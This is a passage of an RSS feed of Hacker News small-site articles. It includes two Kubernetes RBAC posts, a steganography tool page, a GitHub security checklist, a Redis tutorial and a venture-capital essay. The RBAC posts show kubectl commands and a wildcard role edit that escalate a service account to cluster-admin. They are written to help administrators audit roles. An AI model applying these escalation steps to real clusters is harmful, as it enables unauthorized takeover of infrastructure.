error: failed to create clusterrolebinding: clusterrolebindings.rbac.authorization.k8s.io <span>"rbac-clusteradmin"</span> is forbidden: user <span>"system:serviceaccount:default:not-rbac-binder"</span> <span>(</span><span>groups</span><span>=[</span><span>"system:serviceaccounts"</span> <span>"system:serviceaccounts:default"</span> <span>"system:authenticated"</span><span>])</span> is attempting to grant RBAC permissions not currently held:
<span>{</span>APIGroups:[<span>"*"</span><span>]</span>, Resources:[<span>"*"</span><span>]</span>, Verbs:[<span>"*"</span><span>]}</span>
<span>{</span>NonResourceURLs:[<span>"*"</span><span>]</span>, Verbs:[<span>"*"</span><span>]}</span>
</code></pre></div></div>

<p>Then if we try the same operation with <code>rbac-binder</code> it works!</p>

<div><div><pre><code>kubectl <span>--as</span><span>=</span>system:serviceaccount:default:rbac-binder create clusterrolebinding rbac-clusteradmin <span>--clusterrole</span><span>=</span>cluster-admin <span>--serviceaccount</span><span>=</span>namespace:rbac-binder
clusterrolebinding.rbac.authorization.k8s.io/rbac-clusteradmin created
</code></pre></div></div>

<h2 id="conclusion">Conclusion</h2>

<p>The bind verb on RBAC is a useful piece of Kubernetes RBAC configuration but it’s also a lesser known are of RBAC and one which not all tools might properly understand. As it can allow for privilege escalation, it’s an important thing to check for when creating or auditing roles and clusterroles.</p>

	  </div></div>]]>
            </description>
            <link>https://raesene.github.io/blog/2021/01/16/Getting-Into-A-Bind-with-Kubernetes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810019</guid>
            <pubDate>Sun, 17 Jan 2021 11:56:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Escalating Away – Kubernetes Roles Based Access System]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25810016">thread link</a>) | @kiyanwang
<br/>
January 17, 2021 | https://raesene.github.io/blog/2020/12/12/Escalating_Away/ | <a href="https://web.archive.org/web/*/https://raesene.github.io/blog/2020/12/12/Escalating_Away/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	  <p>Following a recent run of the container security training course I do, I was poking around a bit with the escalate verb in Kubernetes RBAC and found some interesting points, so thought it’d be worth documenting, as it’s not necessarily the best known part of RBAC.</p>

<p>The reason we were interested in the escalate verb is to answer the question “If I can get secrets in a standard kubeadm cluster, what are my options for escalating my privileges to cluster-admin?”. This question used to be pretty straightforward as until last year there was a service account in the kube-system namespace which had cluster-admin rights, so you could easily get its secret and be cluster-admin. The service account in question is <code>clusterrole-aggregation-controller</code>. However last year the rights on this service account got changed (at least in part as I pointed it out). From <a href="https://github.com/kubernetes/kubernetes/commit/8b155e82d876c8130962e61b2235f2bd066abde1">the commit</a> you can see that the cluster-admin rights were replaced with <code>escalate</code> rights on cluster roles.</p>

<p>So that leads to the question, “how can I use this permission?”. Unlike the <code>impersonate</code> verb, there’s no handy kubectl flags to add to instantly escalate your rights. So I was looking for information on the topic (which is pretty sparse) and found this <a href="https://www.impidio.com/blog/kubernetes-rbac-security-pitfalls">interesting blog post</a>, which led to the answer.</p>

<p>What escalate does is bypass the Kubernetes RBAC check which prevents users who are able to create roles or cluster roles from creating (or editing) these objects to have more rights than they do. So what we can do, once we have the service account token for the clusterrole-aggregation-controller is to edit our own cluster role to increase our permissions?</p>

<p>We can run <code>kubectl edit clusterrole system:controller:clusterrole-aggregation-controller</code> and then edit it to add this to the rules section</p>

<div><div><pre><code>- apiGroups:
  - '*'
  resources:
  - '*'
  verbs:
  - '*'
</code></pre></div></div>

<p>and away you go!</p>

<h2 id="conclusion">Conclusion</h2>

<p>Things like <code>bind</code>, <code>escalate</code> and <code>impersonate</code> are lesser known features of RBAC but one that you should be aware of if you’re a systems administrator or if you’re looking at security tooling around Kubernetes.</p>

	  </div></div>]]>
            </description>
            <link>https://raesene.github.io/blog/2020/12/12/Escalating_Away/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810016</guid>
            <pubDate>Sun, 17 Jan 2021 11:54:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Snow – Whitespace Steganography]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25810004">thread link</a>) | @mrccc
<br/>
January 17, 2021 | http://darkside.com.au/snow/ | <a href="https://web.archive.org/web/*/http://darkside.com.au/snow/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    
    <br>
    <h3>Whitespace steganography</h3>
    <p>
      The program SNOW is used to conceal messages in ASCII text by
      appending whitespace to the end of lines. Because spaces and tabs
      are generally not visible in text viewers, the message is
      effectively hidden from casual observers. And if the built-in
      encryption is used, the message cannot be read even if it is detected.
    </p>
    <h3>What's in a name?</h3>
    <p>
      SNOW exploits the Steganographic Nature Of Whitespace. Locating trailing
      whitespace in text is like finding a polar bear in a <em>snow</em>storm
      (which, by the way, explains the <a href="http://darkside.com.au/snow/logo.html">logo</a>).
      And it uses the <a href="http://darkside.com.au/ice/index.html">ICE</a>
      encryption algorithm, so the name is thematically consistent.
    </p>
    <h3>It's free!</h3>
    <p>
      As of 16 June 2013, SNOW is available under an Apache 2.0 licece.
      The usual conditions apply, but if you find SNOW useful for anything,
      the <a href="mailto:mkwan@darkside.com.au">author</a> would love to hear
      about it.
    </p>
    <h3>Recent changes</h3>
    <p>
      Prior to 22 November 1998 the DOS version, contained in
      <em>snowdos.zip</em>, had a bug affecting encryption. Files concealed
      with encryption using the DOS version could not be decrypted by the
      other versions, and vice versa. The bug was caused by bit-shifting of
      16-bit variables in DOS. This has now been fixed.
    </p>
    <p>
      The source version, when compiled under Unix, also had a bug where it
      could not read data concealed by the DOS version, owing to the carriage
      return character appended by DOS. This has also been fixed as of
      22 November 1998.
    </p>
    <ul>
      <li>Documentation</li>
      <ul>
        <li><a href="http://darkside.com.au/snow/description.html">How it works</a></li>
        <li><a href="http://darkside.com.au/snow/manual.html">Manual page</a></li>
        <li><a href="http://darkside.com.au/snow/logo.html">About the logo</a></li>
      </ul>
      <li>Download source
      <ul>
        <li><a href="http://darkside.com.au/snow/snow-20130616.tar.gz">snow-20130616.tar.gz</a>
		(16210 bytes)</li>
        <li><a href="http://darkside.com.au/snow/snow.zip">snow.zip</a> (22071 bytes)</li>
      </ul>
      </li><li> Download DOS/Windows executable
      <ul>
        <li>16-bit executable <a href="http://darkside.com.au/snow/snwdos16.zip">snwdos16.zip</a>
		(27001 bytes)</li>
        <li>32-bit executable <a href="http://darkside.com.au/snow/snwdos32.zip">snwdos32.zip</a>
		(30961 bytes)</li>
      </ul>
      </li><li>Download Java 1.1 version</li>
      <ul>
        <li>Java source <a href="http://darkside.com.au/snow/jsnow.zip">jsnow.zip</a> (10691 bytes)</li>
        <li>Java classes <a href="http://darkside.com.au/snow/jsnow.jar">jsnow.jar</a> (24039 bytes)</li>
      </ul>
      <li> Java 1.1 applet</li>
      <ul>
        <li>Download source, classes, and doco
		<a href="http://darkside.com.au/snow/jsnowapp.zip">jsnowapp.zip</a> (35117 bytes)</li>
        <li>Run the <a href="http://darkside.com.au/snow/jsnowapp.html">applet</a> (Note - needs Java 1.1
		browser)</li>
      </ul>
      <li>Examples</li>
      <ul>
        <li>Dr Rick Perry's interactive
	<a href="http://www.ece.villanova.edu/~perry/ccs/snow/snow.html">
		CGI script</a> for concealing/extracting messages in HTML
		pages.</li>
      </ul>
      <li><a href="http://darkside.com.au/snow/author.html">About the author</a></li>
    </ul>
    <br>
    <hr>
    <p><span size="-1">
	Document last modified by Matthew Kwan, 20 June 2013
	<br>
	Please send any comments or corrections to
	<a href="mailto:mkwan@darkside.com.au">mkwan@darkside.com.au</a>
      </span>
    </p>
  

</div>]]>
            </description>
            <link>http://darkside.com.au/snow/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810004</guid>
            <pubDate>Sun, 17 Jan 2021 11:51:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securing Your GitHub Project]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809990">thread link</a>) | @kiyanwang
<br/>
January 17, 2021 | https://marcinhoppe.com/securing-your-github-project/ | <a href="https://web.archive.org/web/*/https://marcinhoppe.com/securing-your-github-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Recently I have been <a href="https://github.com/ossf/wg-vulnerability-disclosures/tree/main/docs/meeting-notes">thinking</a> and <a href="https://www.youtube.com/watch?v=aFFyQIoiis8&amp;list=PLVl2hFL_zAh92RfDsgOgNifYiuYOOMawS">talking to other people</a> about <a href="https://openssf.org/">open source security</a>. The more conversations I had, the more convinced I became that this is a <a href="https://github.com/ossf/wg-identifying-security-threats/blob/main/publications/threats-risks-mitigations/v1.1/Threats%2C%20Risks%2C%20and%20Mitigations%20in%20the%20Open%20Source%20Ecosystem%20-%20v1.1.pdf">very complex</a> topic. It is full of nuance and <a href="https://addxorrol.blogspot.com/2019/08/rashomon-of-disclosure.html">conflicting opinions</a>. It is also an area that is in need of guidance and educational content.</p><p>Making good security practices the path of least resistance is a solid way to raise the bar in this space.</p><p><a href="https://github.com/">GitHub</a> is in a very special position. It is the dominant platform for open source projects. I am very positively surprised that GitHub has been consistently adding <a href="https://github.com/security">security features</a> to the platform. I am sure they are not done yet, but today they cover a pretty broad set of capabilities that allow for strong authentication, protecting and recovering from sensitive data leaks, managing vulnerabilities in dependencies, scanning source code for potential security issues, and disclosing vulnerabilities.</p><p>Those features are great, and I want to make programmers more aware of how to use them, and when.</p><p>If you don’t know how to secure your open source project, I put together a checklist that you can use to get started.</p><ol><li><strong>Use a credential manager to protect your access credentials</strong>. Regardless of whether you use username and password or <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh">SSH keys</a> to authenticate to GitHub, make sure to <a href="https://github.blog/2020-07-02-git-credential-manager-core-building-a-universal-authentication-experience/">protect them well</a>. Leaked credentials may allow attackers to take over your project and use it to attack your users.</li><li><strong>Configure two-factor authentication (2FA)</strong>. GitHub offers <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/securing-your-account-with-two-factor-authentication-2fa">several 2FA mechanisms</a> to provide stronger authentication. You can use one-time codes sent over <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/configuring-two-factor-authentication#configuring-two-factor-authentication-using-text-messages">text messages</a> (SMS) and <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/configuring-two-factor-authentication#configuring-two-factor-authentication-using-a-totp-mobile-app">mobile apps</a>. If you want even stronger protection, you can use <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/configuring-two-factor-authentication#configuring-two-factor-authentication-using-a-security-key">security keys</a> as your second authentication factor.</li><li><strong>Enforce signed commits</strong>. Git makes it <a href="https://medium.com/@pjbgf/spoofing-git-commits-7bef357d72f0">a little bit too easy to spoof commits</a> and allow attackers to make their code to look like yours. GitHub supports <a href="https://git-scm.com/book/en/v2/Git-Tools-Signing-Your-Work">cryptographic protection</a> against such attacks.</li><li><strong>Protect the release branch</strong>. Not all branches in your repo were created equal. Git promotes a development model where branches are cheap, and the bulk of work happens in branches. Some of them are used to release software. These branches should have additional <a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/about-protected-branches">rules that govern who and when can merge changes</a>.</li><li><strong>Require pull request reviews and approvals</strong>. Git and GitHub are all about <a href="https://guides.github.com/introduction/flow/">enabling collaboration</a> but it does not mean that you cannot <a href="https://docs.github.com/en/free-pro-team@latest/github/collaborating-with-issues-and-pull-requests/approving-a-pull-request-with-required-reviews">control what code is merged</a>. You can and you should.</li><li><strong>Scan source code for sensitive data leaks</strong>. Mistakes happen and we sometimes commit sensitive data to public repositories. GitHub <a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/about-secret-scanning#about-secret-scanning-for-public-repositories">integrates with multiple services</a> and can <a href="https://docs.github.com/en/free-pro-team@latest/developers/overview/secret-scanning">detect their leaked secrets</a>.</li><li><strong>Scrub leaked secrets from git history</strong>. Sensitive data leaked into a public GitHub repository might be out of your control. Git and GitHub allow you to contain the damage by <a href="https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History">rewriting git history</a> to remove the sensitive data. It is not full remediation, but we should still do it to limit the blast radius.</li><li><strong>Only use trusted GitHub Actions</strong>. GitHub Actions are tremendously useful, but if you are not careful, you may end up running malicious or sloppy code in your build pipeline. Make sure you <a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/security-hardening-for-github-actions#using-third-party-actions">only run Actions you trust</a>.</li><li><strong>Protect the secrets used by GitHub Actions</strong>. GitHub Actions that handle software releases and deployment often require credentials to work. Make sure these credentials<a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/security-hardening-for-github-actions#using-secrets"> are appropriately protected</a>.</li><li><strong>Review project dependencies for vulnerabilities</strong>. Our code is rarely written from scratch. Modern applications are built on top of a rich ecosystem of open sources modules and packages. Some of those packages contain security vulnerabilities that may impact your code. Make sure you <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/managing-vulnerabilities-in-your-projects-dependencies">review and vet your dependencies</a>.</li><li><strong>Patch dependencies with vulnerabilities</strong>. Security vulnerabilities are discovered and disclosed every day. Plan and be prepared to patch your vulnerabilities. GitHub allows you to <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/about-dependabot-security-updates">automate much of this process using Dependabot</a>. Use it if you can.</li><li><strong>Scan project source code for vulnerabilities</strong>. Your code can have security bugs, too. Discovering vulnerabilities is still a bit more art than science but there is a lot of progress in automated source code analysis. <a href="https://securitylab.github.com/tools/codeql">GitHub CodeQL</a> is a <a href="https://docs.github.com/en/free-pro-team@latest/github/finding-security-vulnerabilities-and-errors-in-your-code/automatically-scanning-your-code-for-vulnerabilities-and-errors">state-of-the-art security analyzer</a>. At least try it out.</li><li><strong>Publish a security policy</strong>. If your project is successful, there is a chance that someone will discover a security flaw in your code. <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/adding-a-security-policy-to-your-repository">Make it easy for them to report it</a> and be very clear about what you will do with that report.</li><li><strong>Collaborate on fixes for security vulnerabilities in private forks</strong>. Working in the open means that it is impossible to hide things. And yet, sometimes you will want to work on some changes in the code in private, for example when fixing a security vulnerability. Working on a fix in the open might allow attackers to reverse engineer the bug and attack your users. GitHub provides a <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability">mechanism to easily create a private fork of your repo</a>. Use this private fork to collaborate on a fix.</li><li><strong>Publish maintainer advisories for security fixes</strong>. Fixing a security vulnerability is no small feat and you should tell your users about it. You should do it in a way that will make it easy for them to learn about it and patch (see point 11 above). GitHub provides an <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/publishing-a-security-advisory">easy way to publish a security advisory</a> that will be incorporated into security scanning tools that your users depend on to keep their applications secure.</li></ol><p>Completing all these tasks is a very good start. If your project is successful, you will be well equipped to handle increased expectations your users will have of the security of your code.</p><p>From the documentation, of course! GitHub has very decent docs and they cover the security features pretty well. I provided links to git and GitHub documentation wherever I could.</p><p>That said, I thought there is <a href="https://marcinhoppe.com/courses/">another way to reach a broader development community</a> to evangelize using good open source security practices. I am currently working on a <a href="https://www.pluralsight.com/">Pluralsight</a> course that demonstrates how to implement items from this checklist for a fictional open source project.</p><p>I think it is going to be a fun and engaging way to demonstrate how to implement security best practices. Stay tuned!</p>
        </div></div>]]>
            </description>
            <link>https://marcinhoppe.com/securing-your-github-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809990</guid>
            <pubDate>Sun, 17 Jan 2021 11:49:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Redis: Filter and sort your data in a SQL-like way using SORT]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809935">thread link</a>) | @eko
<br/>
January 17, 2021 | https://vincent.composieux.fr/article/redis-filter-and-sort-your-data-in-a-sql-like-way-using-sort | <a href="https://web.archive.org/web/*/https://vincent.composieux.fr/article/redis-filter-and-sort-your-data-in-a-sql-like-way-using-sort">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img src="https://vincent.composieux.fr/img/blog/redis-filter-sort.jpeg" alt="Redis: How to filter and sort your data such as using SQL"></p>
<p>Redis is a database that stores your data in memory and is most often used for caching and sometimes also as a message broker.</p>
<p>Most of the time, it is therefore used as a simple key/value cache but it also provides structures to store for example data lists (sets), key/value hashes (hashes / hash sets), sorted sets (sorted sets) and many others.</p>
<p>In this article, we will mainly focus on the <code>Set</code> and <code>HSet</code> types in order to see how we could filter and sort these data, as we would do with SQL.</p>
<p>This is certainly not a good practice, you will in most cases have to use a relational database but it can be useful to know these mechanisms in some cases.</p>

<p>The <code>Sets</code> Redis allow you to insert a set of values under a given key. For example, in the case of a list of products, we can store in Redis the following <code>Set</code>:</p>
<table>
<thead>
<tr>
<th>products</th>
</tr>
</thead>
<tbody>
<tr>
<td>product:id:1</td>
</tr>
<tr>
<td>product:id:2</td>
</tr>
<tr>
<td>product:id:3</td>
</tr>
<tr>
<td>...</td>
</tr>
</tbody>
</table>
<p>The Redis commands for inserting, modifying and listing the elements of a set are, among others : <a href="https://redis.io/commands/sadd">SADD</a>, <a href="https://redis.io/commands/srem">SREM</a> and <a href="https://redis.io/commands/smembers">SMEMBERS</a>.</p>
<p>So to insert our data in the set <code>set:products</code>:</p>

<p>It is then easily possible to create sets containing only the identifiers of the data that must be inside the set, to classify products according to a category, for example.</p>
<p>In case the products with the identifiers <code>1</code> and <code>2</code> are associated to an <code>electronic</code> category, I can add them in a dedicated set, which will be useful later:</p>

<p>So far, nothing very complicated. Now let's go a little further with the <code>HSets</code>.</p>

<p>The <code>HSet</code> allows to store several fields/values in the same key. So we begin to see a relationship with the columns/values in a relational database.</p>
<p>The Redis commands allow to insert/modify and list the fields of an hset are, among others : <a href="https://redis.io/commands/hset">HSET</a>, <a href="https://redis.io/commands/hget">HGET</a> and <a href="https://redis.io/commands/hgetall">HGETALL</a>.</p>
<p>So let's make our product table evolve with new fields : <code>price</code> and <code>created_at</code>.</p>
<p>On the Redis side, we would have the keys with the following field/value pairs:</p>
<table>
<thead>
<tr>
<th>key</th>
<th>price</th>
<th>created_at</th>
</tr>
</thead>
<tbody>
<tr>
<td>hset:product:id:1</td>
<td>9.99</td>
<td>2021-01-17T14:00:00Z</td>
</tr>
<tr>
<td>hset:product:id:2</td>
<td>29.99</td>
<td>2021-01-17T15:00:02Z</td>
</tr>
<tr>
<td>hset:product:id:3</td>
<td>49.99</td>
<td>2021-01-17T16:00:04Z</td>
</tr>
<tr>
<td>...</td>
<td>...</td>
<td>...</td>
</tr>
</tbody>
</table>
<p><em>Note</em> : Contrary to a classic set, we have here 3 distinct HSets for each key. For nomenclature reasons and to be able to access the keys quickly, I always prefix them with <code>hset:</code>.</p>
<p>To create these entries in Redis:</p>

<p>Now, to get the <code>price</code> field of the product with the identifier <code>2</code>:</p>

<p>To retrieve all fields, just use <code>HGETALL</code>:</p>

<p>Well, we now have all the elements to allow us to query our data in a very similar way to what we know with SQL. To do this, we will use the <code>SORT</code> command, which, contrary to what its name indicates, allows us to do much more than a simple sort.</p>

<p>I invite you to go to the official documentation page of the <a href="https://redis.io/commands/sort">SORT</a> command.</p>
<p>This command allows to sort a set in ascending/descending alphanumeric order but also to sort the data according to a column provided in a <code>HSet</code>.</p>
<p>We can also directly give it the name of the set corresponding to our filter (category <code>electronic</code> for example). Let's then imagine the following SQL query:</p>

<p>This request allows us to obtain the price of products in the "electronic" category, ordered by descending creation date.</p>
<p>With Redis's <code>SORT</code> function, to make this same request, you just have to do:</p>

<p>Here, the <code>*</code> pattern will be replaced by each value provided in the Set <code>set:products:category:electronic</code>, in our case the product identifier.</p>
<p>In case you also have single keys/values in the form <code>product:id:1</code> with serialized data in a particular format, you can also retrieve them by passing the <code>GET product:id:*</code> pattern to the SORT method.</p>

<p>The SQL query remains quite simple in this case but it is possible to go further by making intersections or unions between several blinds. These can be done using the <a href="https://redis.io/commands/sinterstore">SINTERSTORE</a> and <a href="https://redis.io/commands/sunionstore">SUNIONSTORE</a> commands.</p>
<p>For example, if you have two sets: <code>set:products:category:electronic</code> and <code>set:products:category:computer</code> and there are products in common in both blinds, you can create a Set containing the elements in common in both blinds with:</p>

<p>You can then use this set as a classic set. It is also possible to generate this set on the fly (without storing it in Redis) with <a href="https://redis.io/commands/sinter">SINTER</a> or <a href="https://redis.io/commands/sunion">SUNION</a>.</p>

<p>Redis remains a very good tool for distributed caching, is certainly not destined to become your main database, but in some cases, it can be useful to know these manipulations in order to allow you to better exploit your data.</p>
<p>I hope this article has been useful, don't hesitate to contact me for any further information.</p>
</div></div></div>]]>
            </description>
            <link>https://vincent.composieux.fr/article/redis-filter-and-sort-your-data-in-a-sql-like-way-using-sort</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809935</guid>
            <pubDate>Sun, 17 Jan 2021 11:36:31 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What Bill Gurley Saw]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809886">thread link</a>) | @neilkakkar
<br/>
January 17, 2021 | https://commoncog.com/blog/what-bill-gurley-saw/ | <a href="https://web.archive.org/web/*/https://commoncog.com/blog/what-bill-gurley-saw/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
      <section>
        <p>Something really interesting happens when you consume a boatload of information: your brain begins to pick out patterns from the mass of stories in your head. This is true regardless of whether it’s books that you’re reading, or podcasts, or even just research programs that you’re executing (I know friends who — on becoming a parent — go <em>deep</em> into child development research; the same thing probably happens for them once they cross a certain threshold of information consumption.)</p><p>I read 53 books last year, most of it as an alternative to therapy for pandemic-related burnout. If a stranger were to look at my list of books, it would look like a random grab bag of topics, authors, and ideas. But when <em>I</em> look at my list, I see books falling into clusters, each cluster representing a set of questions I want answered, and in some cases have been investigating for a number of years now.</p><p>I thought I’d start 2021 with one of the questions that leapt out at me over the course of 2020, along with the books (and external sources!) that I consumed in order to investigate it.</p><h2 id="uber-how-do-you-see-into-the-future">Uber: How Do You See Into The Future?</h2><p>I read Mike Isaac’s <em><a href="https://www.goodreads.com/book/show/44573628-super-pumped">Super Pumped</a></em> and Brad Stone’s <em><a href="https://www.goodreads.com/book/show/29905580-the-upstarts">The Upstarts</a></em> fairly late in the year last year, shortly before the Airbnb IPO, and two years after the Uber one.</p><p>The books are ostensibly about Uber’s rise to greatness (and in <em>Super Pumped</em>, Uber’s fall from greatness). Both authors spend some time on the structural and technological changes that led to the rise of the sharing economy, but the bulk of the book is focused on the narrative arc of the main actors. I sometimes read such business biographies and struggle to find useful, generalisable things that I can learn from them — you would think that in Uber’s case, the lessons might be “winning at any cost is often not worth it” or “<a href="https://stratechery.com/2017/the-uber-dilemma/">VCs might stab you in the back if you represent too large a size of their portfolio, because this turns things into a finite game</a> (vs an infinite one)” and “you really really <em>really</em> need to get lucky if you want to take advantage of a structural shift; nobody recognised the underlying reasons for the sharing economy until <em>after</em> the fact”. As with many business biographies, the lessons are often too specific to the story to matter; you read the narrative simply to add an extra business pattern to your head.</p><!--kg-card-begin: html--><!--kg-card-end: html--><p>But that last lesson — on the recognition of structural shifts — isn’t exactly true. While nobody could say that they understood the <em>full</em> opportunity in ride-hailing, I think there’s a plausible case that Uber board member and venture capitalist <a href="https://en.wikipedia.org/wiki/Bill_Gurley">Bill Gurley</a> saw more than most. I spent three books and a couple of podcast episodes looking into it last year — mostly because I was interested in the kind of thinking that allowed Gurley to bet big on Uber. In other words: what did Bill Gurley <em>see</em>? What did he focus on in the fog of uncertainty around early ride-hailing? And how did he pick the right horse?</p><p>It’s easy to forget that in the early days of ride-hailing, it wasn’t at all clear that Uber would emerge as the winner. One of the dangers of reading business history is that everything seems pre-ordained — <em>of course</em> Uber would win; <em>of course</em> they would prevail against government regulation; <em>of course</em> Kalanick was a ridiculously effective combatant in the ride-hailing wars. But for a taste of what it must’ve felt like circa 2011, <a href="https://commoncog.com/blog/what-uncertainty-feels-like/">recall how the fog of uncertainty felt in the early days of the pandemic last year</a>, or even the confusion one feels about the multitude of crypto projects today.</p><p>To hear Isaac and Stone tell it, Gurley met with <em>every</em> Uber-like startup in the 2010-2011 period, long before ride-hailing was on most peoples’s radars. He eventually backed Travis Kalanick and Uber. The story isn’t that straightforward, however: before he found Kalanick, he offered $8 million to Taxi Magic at a $32 million valuation (he was turned down), and tried to get into an early Cabulous financing round (the founder, John Wolpert, told him the round was ‘full’).</p><p>How did Gurley win? One — trite — answer is that Gurley got lucky. He had been searching for taxi-related marketplace startups for many months, and found Uber only after every other competitor had turned him down. It was thus a stroke of luck that the first — and last! — deal he made in the market turned out to be the winning one.</p><p>But that trite answer obscures another fact: when it comes to marketplace startups, Gurley has had a hell of a track record. He invested in GrubHub, Nextdoor, LiveOps, OpenTable, Stitch Fix, and Zillow, amongst others. And indeed, whenever I listen to Gurley talk about marketplaces or network effects on a podcast or at an interview, his comments tend to be a <em>lot</em> more nuanced when compared to his contemporaries. You get the feeling that he’s skimming from the surface of a very deep pond.</p><p>Take, for instance, this <a href="https://www.joincolossus.com/episodes/12224182/gurley-all-things-business-and-investing">interview</a> with Patrick O’Shaughnessy:</p><blockquote><strong>Gurley:</strong> And I've come up with this phrase I use internally that I made up. So one day I'll have to write a definition of it, but I call it liquidity quality. And I tell entrepreneurs, “I care way more about that than I do how broad you are. We can use venture dollars and growth playbooks to go broad if the fires burning bright. And so how do you get this liquidity quality high?” And Jeremy <em>(the Yelp founder)</em>, being at those nightclubs in San Francisco and people being super passionate and their review frequency being high, that caused the quality of the experience, even though it was in a very small area.<p>And so I very frequently run into entrepreneurs who think they need to expand to 10 cities really quickly to raise their A or their B or whatever. And I'm like, “No, if you have like incredible unit economics and growth metrics in a single city where it's obvious that your playbook's working and things are spinning and things are getting better and you're basically having network effects, that's way more interesting.”</p><p><strong>O’Shaughnessy:</strong> Are there interesting markers of whether it's liquidity quality or the health of the network itself in a contained area that you find especially interesting?</p><p><strong>Gurley:</strong> I mean, I think that's exactly what you have to look for. The reason I can't say measure A, B and C is you have to know the system that you're looking at and then define what that is. But I think every company that's trying to build a marketplace, UGC <em>(user generated content) </em>and network effect, should have some definition of what quality looks like or liquidity threshold that matters and track it like crazy.</p></blockquote><p>Gurley’s conception of ‘liquidity quality’ made me sit up. If you spend enough time sniffing for <a href="https://commoncog.com/blog/the-mental-model-faq/">tacit mental models</a>, you would learn to recognise signs of expert pattern recognition. Gurley’s inability to articulate ‘liquidity quality’ was likely due to the <a href="https://commoncog.com/blog/the-tacit-knowledge-series/">tacit</a> nature of his recognition: that is, the LQ metric was different for every marketplace startup that Gurley had seen; he could — to paraphrase Supreme Court Justice Potter Stewart — “know it when he saw it”. Later on in the podcast, for instance, Gurley explains:</p><blockquote><strong>Gurley:</strong> … Tinder, ironically did this with parties, not really a UGC, but kind of a UGC company in each city that they would launch in because you want to get the quality up to a certain high level. And Nextdoor, we did the craziest thing in the world. We said, "Until you get to 10 members, you can't open your neighbourhood." So intentionally restrictive because we didn't want ghost town experiences and we knew quality of the experience was a function of how many neighbours were in your system.<p>So we thought the anticipation of getting in was a better user experience than getting in and finding it poor. And so we'd encourage you to go find the other so you could unlock your neighbourhood, is almost like a game heuristic. And so every one of these you'll find there's somebody that understands that nuance and about how this is going to tip and have some type of growth playbook is what people would call it. But I find the number of entrepreneurs that are capable of successfully launching a UGC play is a very small fraction, maybe less than 1% of all entrepreneurs. And they just tend to have a nuanced feel for what it takes to make something come alive and the feature sets that matter and how much they care about quality, I keep going back to that word, but it's what makes the kind of fire burn and then makes it possible to grow into ever bigger circles.</p></blockquote><p>Think about the implication of that insight: Gurley and company restricted the growth of Nextdoor in order to optimise for ‘liquidity quality’ — that ineffable mix of user value and density; they only allowed it to spread to neighbourhoods that were <em>adjacent</em> to existing ones with high LQ. That way, when you signed up for Nextdoor, you would be able to search for reviews of local businesses and services, because it would have already been filled in by users in the adjacent neighbourhoods.</p><p>My point: Gurley appears to have thought <em>really deeply</em> about the nature of networked marketplaces, at a level above many of his peers. One reason for this might be that he started much earlier compared to everyone else:</p><blockquote><strong>Gurley:</strong> So between '93 and '96 I was working on Wall Street at Credit Suisse First Boston in the research department. And literally the first or second day fell into a friendship with Mike Mauboussin, who you've had on many times and who you know well. And Mike and I, even though he was the food analyst and I was the tech analyst, we started sharing ideas and books and whatnot and I actually don't remember which one of us, he might remember, had a book called Complexity by Mitchell Waldrop which was about the rise of the Santa Fe Institute. And in that book, Brian Arthur is one of the heroes, early professor at Santa Fe Institute and someone that had a lot of different radical ideas. And so we had read that book and I think visited Santa Fe and met Brian, but this notion of increasing returns that some company that got to a big level would find it even …</blockquote></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://commoncog.com/blog/what-bill-gurley-saw/">https://commoncog.com/blog/what-bill-gurley-saw/</a></em></p>]]>
            </description>
            <link>https://commoncog.com/blog/what-bill-gurley-saw/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809886</guid>
            <pubDate>Sun, 17 Jan 2021 11:27:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ife Saving Therapy Inhibition by Phones Containing Magnets]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809732">thread link</a>) | @Tomte
<br/>
